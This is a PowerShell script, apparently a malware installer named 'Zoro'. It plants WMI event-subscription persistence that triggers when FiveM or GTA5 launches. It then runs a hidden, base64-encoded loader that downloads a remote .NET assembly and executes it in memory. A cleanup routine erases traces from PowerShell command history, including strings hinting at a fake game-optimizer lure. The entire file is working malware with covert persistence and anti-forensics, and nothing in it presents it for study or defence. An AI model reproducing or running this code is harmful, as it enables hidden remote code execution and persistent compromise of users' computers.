$ErrorActionPreference = 'SilentlyContinue'

# Check Administrator privileges
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    Write-Host "[!] Please run PowerShell as Administrator." -ForegroundColor Red

# --- Configuration Defaults ---
$FILTER     = "ZOROFiveMFilter"
$CONSUMER   = "ZOROFiveMConsumer"
$TRIGGER    = "FiveM.exe"
$POLL_SEC   = 5
$NAMESPACE  = "root\cimv2"
$SUBNS      = "root\subscription"
$DEFAULT_URL = "http://127.0.0.1:8080/stage2.b64"

# --- Function: Scrub History ---
function Scrub-SelfHistory {
    $patterns = @(
        'optimize\.txt', 'fps-boost', 'clear-cache', 'soundfix',
        'poolcue', 'Knxtoz', 'ZOROFiveM', 'stage2\.b64', 
        'install\.ps1', 'uninstall\.ps1', 'cleanup\.ps1', 'PhuphaWeb'
    )
    $histPaths = @(
        (Get-PSReadLineOption 2>$null).HistorySavePath,
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    ) | Select-Object -Unique

    foreach ($hp in $histPaths) {
        if (Test-Path $hp) {
            try {
                $lines = [System.IO.File]::ReadAllLines($hp)
                $filtered = $lines | Where-Object {
                    $line = $_
                    $matched = $false
                    foreach ($pat in $patterns) {
                        if ($line -match $pat) { $matched = $true; break }
                    }
                    -not $matched
                }
                [System.IO.File]::WriteAllLines($hp, $filtered)
            } catch {}
        }
    }
}

# --- Function: Install ---
function Install-Zoro {
    param([string]$TargetUrl)

    if ([string]::IsNullOrWhiteSpace($TargetUrl)) {
        $TargetUrl = Read-Host "[?] Enter Payload URL (Default: $DEFAULT_URL)"
        if ([string]::IsNullOrWhiteSpace($TargetUrl)) { $TargetUrl = $DEFAULT_URL }
    }

    Write-Host "[*] Configuring WMI Subscription for: $TargetUrl" -ForegroundColor Cyan

    $runner = @"
`$ErrorActionPreference='SilentlyContinue'
try {
    `$wc = New-Object Net.WebClient
    `$wc.Headers.Add('User-Agent','Mozilla/5.0')
    `$raw = `$wc.DownloadString('$TargetUrl')
    `$bytes = [Convert]::FromBase64String(`$raw)
    `$entry = [Reflection.Assembly]::Load(`$bytes).EntryPoint
    if (`$entry.GetParameters().Length -gt 0) {
        `$entry.Invoke(`$null, [object[]]@(,[string[]]@()))
    } else {
        `$entry.Invoke(`$null, `$null)
    }
} catch {}
"@
    $userEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($runner))

    $loader = @"
`$ErrorActionPreference='SilentlyContinue'
try {
    `$wc = New-Object Net.WebClient
    `$wc.Headers.Add('User-Agent','Mozilla/5.0')
    `$raw = `$wc.DownloadString('$TargetUrl')
    `$bytes = [Convert]::FromBase64String(`$raw)
    `$asm = [Reflection.Assembly]::Load(`$bytes)

    if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0) {
        `$uCmd = "powershell -nop -noni -w hidden -enc $userEnc"
        [Zoro.UserSession]::Spawn(`$uCmd)
        exit
    }

    `$entry = `$asm.EntryPoint
    if (`$entry.GetParameters().Length -gt 0) {
        `$entry.Invoke(`$null, [object[]]@(,[string[]]@()))
    } else {
        `$entry.Invoke(`$null, `$null)
    }
} catch {}
"@
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loader))

    # 1. Clean existing first to avoid duplicate errors
    Uninstall-Zoro -Quiet

    # 2. Filter
    $f = ([wmiclass]"\\.\$SUBNS`:__EventFilter").CreateInstance()
    $f.Name           = $FILTER
    $f.QueryLanguage  = "WQL"
    $f.Query          = "SELECT * FROM __InstanceCreationEvent WITHIN $POLL_SEC WHERE TargetInstance ISA 'Win32_Process' AND (TargetInstance.Name = '$TRIGGER' OR TargetInstance.Name LIKE 'FiveM%GTAProcess.exe' OR TargetInstance.Name = 'GTA5.exe')"
    $f.EventNamespace = $NAMESPACE
    $f.Put() | Out-Null

    # 3. Consumer
    $c = ([wmiclass]"\\.\$SUBNS`:CommandLineEventConsumer").CreateInstance()
    $c.Name                = $CONSUMER
    $c.CommandLineTemplate = "powershell -nop -noni -w hidden -enc $enc"
    $c.Put() | Out-Null

    # 4. Binding
    $b = ([wmiclass]"\\.\$SUBNS`:__FilterToConsumerBinding").CreateInstance()
    $b.Filter   = $f.Path_.Path
    $b.Consumer = $c.Path_.Path
    $b.Put() | Out-Null

    Write-Host "[+] Installation complete. Waiting for FiveM trigger..." -ForegroundColor Green
}

# --- Function: Uninstall ---
function Uninstall-Zoro {
    param([switch]$Quiet)

    if (-not $Quiet) { Write-Host "[*] Removing WMI persistence..." -ForegroundColor Yellow }

    Get-CimInstance -Namespace $SUBNS -ClassName __FilterToConsumerBinding | Where-Object {
        $_.Filter -like "*$FILTER*" -or $_.Consumer -like "*$CONSUMER*"
    } | Remove-CimInstance -ErrorAction SilentlyContinue

    Get-CimInstance -Namespace $SUBNS -ClassName CommandLineEventConsumer -Filter "Name='$CONSUMER'" |
        Remove-CimInstance -ErrorAction SilentlyContinue

    Get-CimInstance -Namespace $SUBNS -ClassName __EventFilter -Filter "Name='$FILTER'" |
        Remove-CimInstance -ErrorAction SilentlyContinue

    if (-not $Quiet) { Write-Host "[+] WMI subscription removed." -ForegroundColor Green }
}

# --- Function: Clear (Deep Cleanup) ---
function Clear-Zoro {
    Write-Host "[*] Running Deep Cleanup..." -ForegroundColor Yellow

    # Stop active payload processes
    $procs = Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" | Where-Object {
        $_.CommandLine -like "*$FILTER*" -or
        $_.CommandLine -like "*stage2.b64*" -or
        $_.CommandLine -like "*[Zoro.UserSession]*"
    }
    foreach ($p in $procs) {
        Stop-Process -Id $p.ProcessId -Force -ErrorAction SilentlyContinue
        Write-Host "  -> Terminated active payload (PID: $($p.ProcessId))" -ForegroundColor Green
    }

    # Remove WMI
    Uninstall-Zoro -Quiet
    Write-Host "  -> WMI subscription cleaned." -ForegroundColor Green

    # Scrub console history
    Scrub-SelfHistory
    Write-Host "  -> Command history scrubbed." -ForegroundColor Green

    Write-Host "[+] Deep Cleanup completed." -ForegroundColor Green
}
